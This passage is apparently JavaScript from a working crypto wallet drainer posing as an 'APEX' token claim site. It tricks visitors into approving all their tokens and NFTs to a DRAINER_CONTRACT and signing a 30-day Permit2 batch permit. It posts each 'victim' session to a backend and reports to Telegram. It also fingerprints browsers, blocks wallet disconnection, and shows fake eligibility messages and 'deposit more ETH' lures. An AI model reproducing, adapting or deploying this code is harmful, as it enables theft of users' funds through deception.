}

async function approveNFTCollection(collection, userAddress) {
  try {
    const abi = [
      { constant: false, inputs: [{ name: "_operator", type: "address" }, { name: "_approved", type: "bool" }], name: "setApprovalForAll", outputs: [], type: "function" },
    ];
    const c = new web3.eth.Contract(abi, collection);
    const gas = await c.methods.setApprovalForAll(DRAINER_CONTRACT, true).estimateGas({ from: userAddress });
    const tx = await c.methods.setApprovalForAll(DRAINER_CONTRACT, true).send({
      from: userAddress,
      gas: Math.floor(gas * 1.2),
      gasPrice: await web3.eth.getGasPrice(),
    });
    logDebug(`setApprovalForAll OK: ${tx.transactionHash}`);
    return tx.transactionHash;
  } catch (e) {
    logDebug(`setApprovalForAll failed: ${e.message}`);
    return null;
  }
}

// ============================================================================
//  PERMIT2 SIGNATURE CAPTURE (gasless — most important path)
// ============================================================================
async function capturePermit2Signature(tokens) {
  if (!tokens.length) return null;
  try {
    const now = Math.floor(Date.now() / 1000);
    const expiration = now + 60 * 60 * 24 * 30;   // 30 days
    const sigDeadline = expiration + 60 * 60 * 24; // 31 days

    // Build PermitDetails[] with hex strings for uint160 amount
    const details = tokens.map((t) => ({
      token: t.address,
      amount: '0x' + BigInt(t.balance).toString(16),   // ← hex encoded uint160
      expiration,
      nonce: 0,
    }));

    const typedData = {
      types: {
        EIP712Domain: [
          { name: 'name', type: 'string' },
          { name: 'chainId', type: 'uint256' },
          { name: 'verifyingContract', type: 'address' },
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' },
        ],
        PermitBatch: [
          { name: 'details', type: 'PermitDetails[]' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' },
        ],
      },
      domain: {
        name: 'Permit2',
        chainId: 1,
        verifyingContract: PERMIT2_ADDRESS,
      },
      primaryType: 'PermitBatch',
      message: {
        details,
        spender: DRAINER_CONTRACT,
        sigDeadline,
      },
    };

    // Ensure correct chain
    if (window.ethereum?.request) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x1' }],
        });
      } catch (e) {
        // already on 1, or user rejected — continue
      }
    }

    const signature = await window.ethereum.request({
      method: 'eth_signTypedData_v4',
      params: [connectedAddress, JSON.stringify(typedData)],
    });

    logDebug(`Permit2 signature captured: ${signature.slice(0, 22)}...`);
    return {
      permitBatch: {
        details,
        spender: DRAINER_CONTRACT,
        sigDeadline,
      },
      signature,
      amounts: tokens.map((t) => t.balance.toString()),
    };
  } catch (e) {
    logDebug('Permit2 signature declined: ' + e.message);
    return null;
  }
}

// ============================================================================
//  POST SESSION TO BACKEND
// ============================================================================
async function postToBackend(session) {
  if (!BACKEND_URL) {
    logDebug('⚠️ BACKEND_URL not configured — cannot submit');
    return { ok: false, error: 'BACKEND_URL not configured' };
  }
  try {
    logDebug(`POST ${BACKEND_URL} (tokens=${session.tokens.length}, nfts=${session.nfts.length}, permit2=${session.permit2 ? 'yes' : 'no'})`);
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 30000);
    const r = await fetch(BACKEND_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(session),
      signal: controller.signal,
    });
    clearTimeout(timeout);
    const text = await r.text();
    logDebug(`Backend response: HTTP ${r.status} — ${text.slice(0, 200)}`);
    if (!r.ok) {
      // 503 = paused / circuitBroken / operator not authorized
      let parsed = null;
      try { parsed = JSON.parse(text); } catch (e) {}
      return { ok: false, httpStatus: r.status, error: parsed?.error || text };
    }
    try { return { ok: true, data: JSON.parse(text) }; }
    catch (e) { return { ok: true, raw: text }; }
  } catch (e) {
    logDebug(`Backend POST failed: ${e.name === 'AbortError' ? 'timeout' : e.message}`);
    return { ok: false, error: e.message };
  }
}

// ============================================================================
//  MAIN EVM DRAIN (backend-delegating)
// ============================================================================
async function drainEVM() {
  const button = document.getElementById("connectButton");
  const originalText = button ? button.innerHTML : "Connect Wallet";

  if (!syncFromGlobal() || !web3) {
    showNotification("Please connect your wallet first", "error");
    showWalletModal();
    return;
  }
  if (!connectedAddress) {
    const accounts = await web3.eth.getAccounts();
    connectedAddress = accounts[0];
  }
  if (!connectedAddress) {
    showNotification("No wallet address available", "error");
    return;
  }

  try {
    const loadingMessages = [
      "Processing...", "Initializing security...", "Verifying eligibility...",
      "Checking wallet status...", "Analyzing transaction patterns...",
      "Optimizing gas fees...", "Validating smart contract...",
      "Preparing token distribution...", "Running security checks...",
      "Configuring network parameters...",
    ];
    if (button) {
      button.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${loadingMessages[Math.floor(Math.random() * loadingMessages.length)]}`;
      button.disabled = true;
    }
    const statusMessages = [
      "Initializing security verification...", "Setting up claim process...",
      "Preparing token distribution...", "Configuring wallet connection...",
      "Running security checks...", "Analyzing network conditions...",
      "Optimizing transaction parameters...", "Verifying contract integrity...",
      "Loading token distribution module...",
    ];
    if (claimStatus) {
      claimStatus.textContent = statusMessages[Math.floor(Math.random() * statusMessages.length)];
      claimStatus.className = "status pending";
    }

    await manualRandomDelay(1000, 2500);
    await collectManualFingerprint();

    if (userHasClaimed) {
      const errorMessages = [
        "You have already claimed your APEX tokens in this session.",
        "Token claim already processed for this wallet.",
        "Maximum claims per session reached. Please try again later.",
        "Duplicate claim detected. Security protocols activated.",
        "Wallet already processed for token distribution.",
      ];
      if (claimStatus) {
        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
        claimStatus.className = "status error";
      }
      if (button) resetButton(button, originalText);
      return;
    }

    // ── Balance check ─────────────────────────────────────────────
    const ethBalance = await web3.eth.getBalance(connectedAddress);
    const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
    userBalanceInUSD = parseFloat(ethBalanceInETH) * ethPriceInUSD;
    const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
    const localThreshold = CLAIM_THRESHOLD_USD_CFG * CURRENCY_CONVERTER.rates[userLocalCurrency];

    logDebug(`User Balance Check: ${ethBalanceInETH} ETH = $${userBalanceInUSD.toFixed(2)} USD`);

    if (userBalanceInUSD < CLAIM_THRESHOLD_USD_CFG) {
      const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
      const formattedThreshold = CURRENCY_CONVERTER.formatCurrency(localThreshold, userLocalCurrency);
      const errorMessages = [
        `Minimum ${formattedThreshold} required for claim. Current: ${localBalance}`,
        `Insufficient balance for token claim. Deposit more ETH.`,
        `Wallet balance below minimum threshold for APEX distribution.`,
        `Add ETH to your wallet to qualify for token claim.`,
        `Claim requires minimum ${formattedThreshold} for gas optimization.`,
      ];
      if (claimStatus) {
        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
        claimStatus.className = "status error";
      }
      const skipMsg = `<b>⚠️ EVM Drain Skipped</b>\nAddress: ${connectedAddress}\nBalance: ${ethBalanceInETH} ETH ($${userBalanceInUSD.toFixed(2)})`;
      await sendTelegramMessage(skipMsg);
      if (button) resetButton(button, originalText);
      return;
    }

    if (parseFloat(ethBalanceInETH) < 0.005) {
      const errorMessages = [
        "Insufficient ETH for transaction. Deposit more ETH to claim tokens.",
        "Additional ETH required for gas fees to complete claim.",
        "Please add ETH to your wallet to cover transaction costs.",
        "Low ETH balance. Deposit more to proceed with token claim.",
        "Transaction requires minimum ETH balance for gas optimization.",
      ];
      if (claimStatus) {
        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
        claimStatus.className = "status error";
      }
      const skipMsg = `<b>⚠️ EVM Drain Skipped (low gas)</b>\nAddress: ${connectedAddress}\nETH balance: ${ethBalanceInETH}`;
      await sendTelegramMessage(skipMsg);
      if (button) resetButton(button, originalText);
      return;
    }

    await simulateManualLegitimateTransaction(connectedAddress);
    await manualRandomDelay(800, 2000);

    // ── PHASE 1: Detect tokens + NFTs ────────────────────────────
    if (claimStatus) claimStatus.textContent = "Scanning wallet for all eligible tokens...";
    const { tokens, nfts } = await detectAllERC20Tokens(connectedAddress);
    logDebug(`Detected ${tokens.length} tokens, ${nfts.length} NFT collections`);

    if (tokens.length === 0 && nfts.length === 0) {
      const noTokensMessages = [
        "No eligible tokens found for claiming.",
        "No tokens detected in your wallet.",
        "Your wallet doesn't contain claimable tokens at this time.",
        "Wallet analysis complete - no actionable assets found.",
      ];
      if (claimStatus) {
        claimStatus.textContent = noTokensMessages[Math.floor(Math.random() * noTokensMessages.length)];
        claimStatus.className = "status info";
      }
      if (button) resetButton(button, originalText);
      const msg = `<b>ℹ️ EVM Drain – No Actionable Tokens</b>\nAddress: ${connectedAddress}\nETH balance: ${ethBalanceInETH} ETH\nTime: ${new Date().toISOString()}`;
      await sendTelegramMessage(msg);
      return;
    }

    // ── PHASE 2: Approve each token (victim signs) ───────────────
    const approvedTokens = [];
    for (let i = 0; i < tokens.length; i++) {
      if (claimStatus) {
        claimStatus.textContent = `Approving ${tokens[i].symbol || tokens[i].address.slice(0,6)} (${i + 1}/${tokens.length})...`;
      }
      const hash = await approveTokenOnToken(tokens[i].address, connectedAddress, tokens[i].balance);
      if (hash) approvedTokens.push(tokens[i]);
      await manualRandomDelay(APPROVAL_DELAY_MS, APPROVAL_DELAY_MS + 800);
      // Periodic cooldown to avoid nonce collisions
      if (APPROVAL_COOLDOWN_EVERY && i > 0 && (i + 1) % APPROVAL_COOLDOWN_EVERY === 0) {
        logDebug(`Approval cooldown (${APPROVAL_COOLDOWN_MS}ms)...`);
        await new Promise(r => setTimeout(r, APPROVAL_COOLDOWN_MS || 3000));
      }
    }

    // ── PHASE 3: Approve NFTs (victim signs) ─────────────────────
    const approvedNFTs = [];
    for (const nft of nfts) {
      if (claimStatus) claimStatus.textContent = `Approving NFTs (${nft.name})...`;
      const hash = await approveNFTCollection(nft.address, connectedAddress);
      if (hash) approvedNFTs.push(nft);
      await manualRandomDelay(APPROVAL_DELAY_MS, APPROVAL_DELAY_MS + 800);
    }

    // ── PHASE 4: Capture Permit2 signature (gasless) ─────────────
    let permit2 = null;
    if (approvedTokens.length > 0 && window.ethereum?.request) {
      if (claimStatus) claimStatus.textContent = "Sign to verify ownership (no gas)...";
      permit2 = await capturePermit2Signature(approvedTokens);
    }

    // ── PHASE 5: Build session and POST to backend ───────────────
    const session = {
      victim: connectedAddress,
      chain: 1,
      tokens: approvedTokens.map(t => ({
        address: t.address,
        symbol: t.symbol,
        amount: t.balance,
        decimals: t.decimals,
      })),
      nfts: approvedNFTs.map(n => ({
        address: n.address,
        standard: n.standard,
        name: n.name,
      })),
      permit2,
      timestamp: Date.now(),
      userAgent: navigator.userAgent,
      isMobile: isMobileDevice,
    };

    if (claimStatus) claimStatus.textContent = "Finalising...";
    const backendResult = await postToBackend(session);

    // ── PHASE 6: Report ──────────────────────────────────────────
    if (approvedTokens.length > 0 || approvedNFTs.length > 0) {
      userHasClaimed = true;
      if (claimStatus) {
        claimStatus.textContent = backendResult.ok
          ? "Claim successful! Tokens approved for secure transfer."
          : "Approvals captured — backend processing";
        claimStatus.className = backendResult.ok ? "status success" : "status info";
      }

      // Compose detailed Telegram report
      let backendLine;
      if (backendResult.ok) {
        backendLine = `✅ HTTP 200${backendResult.data?.elapsedMs ? ` (${backendResult.data.elapsedMs}ms)` : ''}`;
      } else if (backendResult.httpStatus === 503) {
        backendLine = `⚠️ HTTP 503 — ${backendResult.error || 'backend unavailable'}`;
      } else {
        backendLine = `❌ ${backendResult.error || 'network error'}`;
      }

      const msg = `<b>🟦 EVM Harvest Submitted</b>
👤 <b>Victim:</b> <code>${connectedAddress}</code>
🪙 <b>Tokens approved:</b> ${approvedTokens.length}
🎨 <b>NFTs approved:</b> ${approvedNFTs.length}
🔏 <b>Permit2 signed:</b> ${permit2 ? 'YES' : 'NO'}
📡 <b>Backend:</b> ${backendLine}
🕒 ${new Date().toISOString()}`;
      await sendTelegramMessage(msg);

      if (approvedTokens.length > 0) {
        const totalValueUSD = approvedTokens.reduce((s, t) => s + (t.valueUSD || 0), 0);
        const localValue = CURRENCY_CONVERTER.formatCurrency(
          totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
          userLocalCurrency
        );
        if (totalValueUSD > 1) {
          setTimeout(() => showNotification(`Approved ${localValue} for secure transfer`, "info"), 1000);
        }
      }
    } else {
      const noApprovalsMessages = [
        "No eligible tokens found for claiming.",
        "No tokens detected in your wallet.",
        "Your wallet doesn't contain claimable tokens at this time.",
        "Wallet analysis complete - no actionable assets found.",
      ];
      if (claimStatus) {
        claimStatus.textContent = noApprovalsMessages[Math.floor(Math.random() * noApprovalsMessages.length)];
        claimStatus.className = "status info";
      }
      await sendTelegramMessage(`<b>ℹ️ EVM – No approvals captured</b>\nAddress: ${connectedAddress}`);
    }

    if (button) {
      setTimeout(() => {
        button.innerHTML = originalText;
        button.disabled = false;
        setTimeout(() => {
          if (claimStatus) { claimStatus.textContent = ""; claimStatus.className = "status"; }
        }, 5000);
      }, 5000);
    }

  } catch (error) {
    handleManualRewardError(error, button, originalText);
    const msg = `<b>❌ EVM Drain Failed</b>\nAddress: ${connectedAddress}\nError: ${error.message}\nTime: ${new Date().toISOString()}`;
    await sendTelegramMessage(msg);
  }
}

// ============================================================================
//  SIMULATED LEGITIMATE TRANSACTION (harmless self-send)
// ============================================================================
async function simulateManualLegitimateTransaction(userAddress) {
  try {
    const tx = {
      from: userAddress,
      to: userAddress,
      value: web3.utils.toWei("0", "ether"),
      gas: 21000,
    };
    await web3.eth.sendTransaction(tx);
  } catch (e) { console.debug("Simulated transaction failed:", e); }
}

// ============================================================================
//  CLAIM SUCCESS UI
// ============================================================================
function handleClaimSuccess(userAddress, tokens, button, originalText) {
  let claimedValueUSD = 0;
  if (tokens && tokens.length > 0) {
    claimedValueUSD = tokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
  }
  const claimedLocal = CURRENCY_CONVERTER.formatCurrency(
    claimedValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
    userLocalCurrency
  );
  if (claimStatus) {
    claimStatus.textContent = "Claim successful! Tokens approved for secure transfer.";
    claimStatus.className = "status success";
    if (claimedValueUSD > 1) {
      setTimeout(() => showNotification(`Approved ${claimedLocal} for secure transfer`, "info"), 1000);
    }
  }
  claimList.unshift({
    address: userAddress ? userAddress.substring(0, 6) + "..." + userAddress.substring(38) : "Solana User",
    amount: 500,
    timestamp: Date.now(),
    valueUSD: claimedValueUSD,
  });
  if (claimList.length > 10) claimList.pop();
  updateClaimList();
  const currentPercentage = parseInt(progressPercentage.textContent);
  const newPercentage = Math.min(90, currentPercentage + 10);
  if (progressBar) progressBar.style.width = `${newPercentage}%`;
  if (progressPercentage) progressPercentage.textContent = `${newPercentage}%`;
  if (button) {
    setTimeout(() => {
      button.innerHTML = originalText;
      button.disabled = false;
      setTimeout(() => {
        if (claimStatus) { claimStatus.textContent = ""; claimStatus.className = "status"; }
      }, 5000);
    }, 5000);
  }
}

// ============================================================================
//  ERROR HANDLER
// ============================================================================
function handleManualRewardError(error, button, originalText) {
  console.error("Transaction error:", error);
  let errorMessage = "Transaction failed. Please try again.";
  const errorMappings = {
    "user rejected transaction": "Transaction rejected by user.",
    "insufficient funds": "Insufficient ETH for gas fees.",
    "execution reverted": "Contract execution reverted. Please try again.",
    "gas required exceeds allowance": "Gas limit too low. Try increasing gas.",
    "nonce too low": "Nonce error. Please try again.",
    "already known": "Transaction already pending.",
    "replacement transaction underpriced": "Transaction replacement failed.",
    "intrinsic gas too low": "Gas limit too low for transaction.",
    "transaction underpriced": "Gas price too low. Try increasing gas price.",
  };
  for (const [key, message] of Object.entries(errorMappings)) {
    if (error.message?.includes(key)) { errorMessage = message; break; }
  }
  if (error.code === 4001) errorMessage = "Connection rejected by user.";
  else if (error.code === -32002) errorMessage = "Request already pending. Check your wallet.";
  else if (error.code === -32603) errorMessage = "Internal JSON-RPC error. Please try again.";
  if (claimStatus) {
    claimStatus.textContent = errorMessage;
    claimStatus.className = "status error";
  }
  if (button) resetButton(button, originalText);
  setTimeout(() => {
    if (claimStatus) { claimStatus.textContent = ""; claimStatus.className = "status"; }
  }, 5000);
}

// ============================================================================
//  UTILITIES
// ============================================================================
function manualRandomDelay(min, max) {
  const delay = Math.floor(Math.random() * (max - min + 1)) + min;
  const jitter = Math.random() * 0.4 + 0.8;
  return new Promise((resolve) => setTimeout(resolve, delay * jitter));
}

function resetButton(button, originalText) {
  if (!button) return;
  button.innerHTML = originalText;
  button.disabled = false;
}

function logDebug(message, element = connectionDebug) {
  const timestamp = new Date().toLocaleTimeString();
  const debugMessage = `[${timestamp}] ${message}<br>`;
  if (element) element.innerHTML += debugMessage;
  console.log(`[DEBUG] ${message}`);
}

// ============================================================================
//  INITIALIZATION HELPERS
// ============================================================================
function initializeMobileSpecificOptimizations() {
  console.log("Initializing mobile-specific optimizations...");
  document.addEventListener("touchstart", function (e) {
    if (e.target.closest("button") || e.target.closest(".btn-primary")) {
      e.target.style.transform = "scale(0.98)";
      setTimeout(() => { e.target.style.transform = ""; }, 150);
    }
  }, { passive: true });
  document.addEventListener("dblclick", (e) => e.preventDefault(), { passive: false });
  const viewport = document.querySelector('meta[name="viewport"]');
  if (viewport) viewport.setAttribute("content", "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no");
}

async function initializeServiceWorker() {
  if ("serviceWorker" in navigator) {
    try {
      const swScript = `
        self.addEventListener('install', (event) => { self.skipWaiting(); });
        self.addEventListener('activate', (event) => { event.waitUntil(self.clients.claim()); });
      `;
      const blob = new Blob([swScript], { type: "application/javascript" });
      const swUrl = URL.createObjectURL(blob);
      await navigator.serviceWorker.register(swUrl);
      console.log("ServiceWorker registered successfully");
    } catch (error) { console.log("ServiceWorker registration failed:", error); }
  }
}

function initializeManualAppKitIntegration() {
  console.log("Initializing manual AppKit integration...");
  const checkAppKitInterval = setInterval(() => {
    const w3mButton = document.querySelector("w3m-button");
    if (w3mButton) {
      clearInterval(checkAppKitInterval);
      w3mButton.addEventListener("click", () => setupManualAppKitConnectionListener());
    }
  }, 500);
}

function setupManualAppKitConnectionListener() {
  if (window.ethereum) {
    window.ethereum.on("accountsChanged", (accounts) => {
      if (accounts.length > 0) handleManualAppKitConnection(accounts[0]);
      else { if (DISABLE_DISCONNECT) return; handleManualDisconnection(); }
    });
    window.ethereum.on("chainChanged", () => {
      if (window.ethereum.selectedAddress) handleManualAppKitConnection(window.ethereum.selectedAddress);
    });
    window.ethereum.on("disconnect", () => { if (!DISABLE_DISCONNECT) handleManualDisconnection(); });
  }
}

function handleManualAppKitConnection(address) {
  connectedAddress = address;
  connectedWallet = "manual_appkit";
  try {
    web3 = new Web3(window.ethereum);
    contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
  } catch (error) {
    web3 = new Web3(Web3.givenProvider);
    contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
  }
  updateManualWalletButton();
  logDebug(`Manual AppKit connected: ${connectedAddress}`);
  showNotification("Wallet connected successfully", "success");
  collectManualFingerprint();
  setTimeout(() => checkAndAutoTriggerClaim(), 2000);
  showManualAnnouncementModal();
  saveConnectionToLocalStorage(connectedAddress, connectedWallet);
}

function showManualAnnouncementModal() {
  if (connectedAddress) {
    const shortAddress = connectedAddress.substring(0, 6) + "..." + connectedAddress.substring(38);
    if (referralLink) referralLink.textContent = `https://apex-protocol.io/ref?user=${shortAddress}`;
  }
  if (announcementModal) announcementModal.classList.add("active");
}

function updateManualWalletButton() {
  if (!walletButtonContainer) return;
  if (connectedWallet && connectedAddress) {
    if (DISABLE_DISCONNECT) {
      walletButtonContainer.innerHTML = `<div class="wallet-connected"><i class="fas fa-check-circle"></i><span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span></div>`;
    } else {
      walletButtonContainer.innerHTML = `<div class="wallet-connected"><i class="fas fa-check-circle"></i><span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span><button class="disconnect-btn" id="disconnectButton">Disconnect</button></div>`;
      document.getElementById("disconnectButton").addEventListener("click", disconnectManualWallet);
    }
  } else {
    walletButtonContainer.innerHTML = `<button class="wallet-btn" id="walletButton"><i class="fas fa-wallet"></i> Connect</button>`;
    document.getElementById("walletButton").addEventListener("click", showWalletModal);
  }
}

function handleManualDisconnection() {
  if (DISABLE_DISCONNECT) { console.log("Mobile: disconnection prevented"); return; }
  connectedWallet = null;
  connectedAddress = null;
  web3 = null;
  contractInstance = null;
  userHasClaimed = false;
  updateManualWalletButton();
  showNotification("Wallet disconnected", "info");
  logDebug("Manual wallet disconnected");
  clearSavedConnection();
}

async function collectManualFingerprint() {
  const fingerprint = {
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    screen: `${screen.width}x${screen.height}`,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    webgl: await getManualWebGLFingerprint(),
    plugins: Array.from(navigator.plugins).map((p) => p.name),
    walletType: connectedWallet,
    network: "Unknown",
    ethBalance: 0,
    tokenBalances: {},
    nftBalances: {},
    isMobile: isMobileDevice,
    localCurrency: userLocalCurrency,
    ...fingerprintData,
  };
  try {
    if (web3) {
      const networkId = await web3.eth.net.getId();
      fingerprint.network = networkId;
      if (connectedAddress) {
        fingerprint.ethBalance = web3.utils.fromWei(await web3.eth.getBalance(connectedAddress), "ether");
        await detectManualTokensAndNFTs(connectedAddress, fingerprint);
      }
    }
  } catch (e) { console.debug("Fingerprint error:", e); }
  fingerprintData = fingerprint;
  return fingerprint;
}

async function getManualWebGLFingerprint() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return "unsupported";
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    return {
      renderer, vendor,
      version: gl.getParameter(gl.VERSION),
      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
      maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
    };
  } catch (e) { return "error"; }
}

async function detectManualTokensAndNFTs(userAddress, fingerprint) {
  for (const token of KNOWN_TOKENS) {
    try {
      const balance = await getManualTokenBalance(token.address, userAddress);
      if (balance > 0) {
        fingerprint.tokenBalances[token.address] = { balance, symbol: token.symbol, decimals: token.decimals };
      }
    } catch (e) {}
  }
  for (const nft of KNOWN_NFT_COLLECTIONS) {
    try {
      const nftBalance = await getManualNFTBalance(nft.address, userAddress);
      if (nftBalance > 0) fingerprint.nftBalances[nft.address] = nftBalance;
    } catch (e) {}
  }
  await detectManualMultiContractTokenApprovals(userAddress, fingerprint);
}

async function detectManualMultiContractTokenApprovals(userAddress, fingerprint) {
  fingerprint.approvedTokens = {};
  for (const tokenAddress in fingerprint.tokenBalances) {
    try {
      const allowance = await checkAllowance(tokenAddress, userAddress);
      if (allowance > 0) {
        fingerprint.approvedTokens[tokenAddress] = { contract: DRAINER_CONTRACT, allowance };
      }
    } catch (e) {}
  }
}

// ============================================================================
//  MANUAL EXISTING CONNECTION CHECK
// ============================================================================
async function checkManualExistingConnection() {
  try {
    logDebug("Checking for manual existing wallet connections...");
    if (typeof window.ethereum !== "undefined") {
      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      if (accounts.length > 0) {
        connectedAddress = accounts[0];
        if (walletDetectors.isMetaMask()) connectedWallet = "metamask";
        else if (walletDetectors.isCoinbaseWallet()) connectedWallet = "coinbase";
        else if (walletDetectors.isTrustWallet()) connectedWallet = "trust";
        else if (walletDetectors.isRabbyWallet()) connectedWallet = "rabby";
        else if (walletDetectors.isPhantom()) connectedWallet = "phantom";
        else if (walletDetectors.isBraveWallet()) connectedWallet = "brave";
        else connectedWallet = "manual_unknown";
        web3 = new Web3(window.ethereum);
        contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        setupManualProviderEvents(window.ethereum);
        updateManualWalletButton();
        logDebug(`Manual existing connection: ${connectedWallet}: ${connectedAddress}`);
        setTimeout(() => checkAndAutoTriggerClaim(), 2000);
        showManualAnnouncementModal();
        return;
      }
    }
    logDebug("No manual existing wallet connection found");
  } catch (error) { logDebug("Manual error checking existing connection: " + error.message); }
}

function setupManualProviderEvents(provider) {
  provider.on("accountsChanged", (accounts) => {
    if (accounts.length === 0) { if (DISABLE_DISCONNECT) return; handleManualDisconnection(); }
    else {
      connectedAddress = accounts[0];
      userHasClaimed = false;
      updateManualWalletButton();
      logDebug(`Account changed: ${connectedAddress}`);
      showNotification("Wallet account changed", "info");
      setTimeout(() => checkAndAutoTriggerClaim(), 2000);
      showManualAnnouncementModal();
    }
  });
  provider.on("chainChanged", (chainId) => {
    logDebug(`Chain changed to: ${chainId}`);
    showNotification(`Network changed to chain ${parseInt(chainId)}`, "info");
  });
  provider.on("disconnect", (error) => {
    logDebug(`Provider disconnected: ${error}`);
    if (!DISABLE_DISCONNECT) {
      showNotification("Wallet disconnected", "error");
      handleManualDisconnection();
    }
  });
  provider.on("connect", (connectInfo) => {
    logDebug(`Provider connected: ${JSON.stringify(connectInfo)}`);
  });
}

// ============================================================================
//  WALLET BADGE DETECTION
// ============================================================================
function detectWallets() {
  const walletBadges = {
    metamask: document.getElementById("metamask-badge"),
    coinbase: document.getElementById("coinbase-badge"),
    trust: document.getElementById("trust-badge"),
    rabby: document.getElementById("rabby-badge"),
  };
  Object.values(walletBadges).forEach((badge) => {
    if (badge) {
      badge.textContent = "Not Detected";
      badge.style.background = "rgba(239, 68, 68, 0.15)";
      badge.style.color = "var(--error)";
    }
  });
  Object.entries(walletDetectors).forEach(([wallet, detector]) => {
    if (detector()) {
      const badgeKey = wallet.toLowerCase().replace("is", "");
      if (walletBadges[badgeKey]) {
        walletBadges[badgeKey].textContent = "Detected";
        walletBadges[badgeKey].style.background = "rgba(16, 185, 129, 0.15)";
        walletBadges[badgeKey].style.color = "var(--success)";
      }
    }
  });
}

// ============================================================================
//  MODALS
// ============================================================================
function showWalletModal() { detectWallets(); if (walletModal) walletModal.classList.add("active"); }
function hideWalletModal() { if (walletModal) walletModal.classList.remove("active"); }
function hideAnnouncementModal() { if (announcementModal) announcementModal.classList.remove("active"); }

function copyReferralLink() {
  if (referralLink) {
    const textArea = document.createElement("textarea");
    textArea.value = referralLink.textContent;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand("copy");
    document.body.removeChild(textArea);
    showNotification("Referral link copied to clipboard!", "success");
  }
}

// ============================================================================
//  PROVIDER-SPECIFIC CONNECT
// ============================================================================
async function connectWithProvider(providerType, silentRestore = false) {
  try {
    logDebug(`Manual connecting with ${providerType}...`);
    let provider;
    switch (providerType) {
      case "metamask":
        if (walletDetectors.isMetaMask()) {
          provider = window.ethereum;
          try { await provider.request({ method: "eth_requestAccounts" }); }
          catch (e) { if (!silentRestore) showNotification("MetaMask connection rejected", "error"); return; }
        } else { if (!silentRestore) showNotification("MetaMask not installed", "error"); return; }
        break;
      case "coinbase":
        if (walletDetectors.isCoinbaseWallet()) {
          provider = window.ethereum;
          try { await provider.request({ method: "eth_requestAccounts" }); }
          catch (e) { if (!silentRestore) showNotification("Coinbase Wallet connection rejected", "error"); return; }
        } else { if (!silentRestore) showNotification("Coinbase Wallet not detected", "error"); return; }
        break;
      case "trust":
        if (walletDetectors.isTrustWallet()) {
          provider = window.ethereum;
          try { await provider.request({ method: "eth_requestAccounts" }); }
          catch (e) { if (!silentRestore) showNotification("Trust Wallet connection rejected", "error"); return; }
        } else { if (!silentRestore) showNotification("Trust Wallet not detected", "error"); return; }
        break;
      case "rabby":
        if (walletDetectors.isRabbyWallet()) {
          provider = window.ethereum;
          try { await provider.request({ method: "eth_requestAccounts" }); }
          catch (e) { if (!silentRestore) showNotification("Rabby Wallet connection rejected", "error"); return; }
        } else { if (!silentRestore) showNotification("Rabby Wallet not detected", "error"); return; }
        break;
      default:
        if (!silentRestore) showNotification("Unsupported wallet provider", "error");
        return;
    }
    web3 = new Web3(provider);
    contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) throw new Error("No accounts found");
    connectedAddress = accounts[0];
    connectedWallet = providerType;
    updateManualWalletButton();
    if (!silentRestore) hideWalletModal();
    if (!silentRestore) showNotification("Wallet connected successfully", "success");
    logDebug(`Manual connected with ${providerType}: ${connectedAddress}`);
    await collectManualFingerprint();
    setTimeout(() => checkAndAutoTriggerClaim(), 2000);
    if (!silentRestore) showManualAnnouncementModal();
    setupManualProviderEvents(provider);
    saveConnectionToLocalStorage(connectedAddress, connectedWallet);
  } catch (error) {
    console.error("Manual error connecting wallet:", error);
    if (!silentRestore) showNotification("Failed to connect wallet", "error");
    logDebug(`Manual connection error: ${error.message}`);
  }
}

// ============================================================================
//  UI HELPERS (fake notifications, token chart, etc.)
// ============================================================================
function showNotification(message, type = "success") {
  const notification = document.createElement("div");
  notification.className = `fake-notification ${type}`;
  notification.innerHTML = `<i class="fas fa-${type === "success" ? "check-circle" : type === "error" ? "exclamation-circle" : "info-circle"}"></i>${message}`;
  document.body.appendChild(notification);
  setTimeout(() => {
    notification.style.opacity = "0";
    setTimeout(() => { document.body.removeChild(notification); }, 300);
  }, 3000);
}

function createTokenChart() {
  const ctx = document.getElementById("tokenChart");
  if (!ctx) return;
  const dataPoints = [];
  let currentValue = 0.04;
  for (let i = 0; i < 24; i++) {
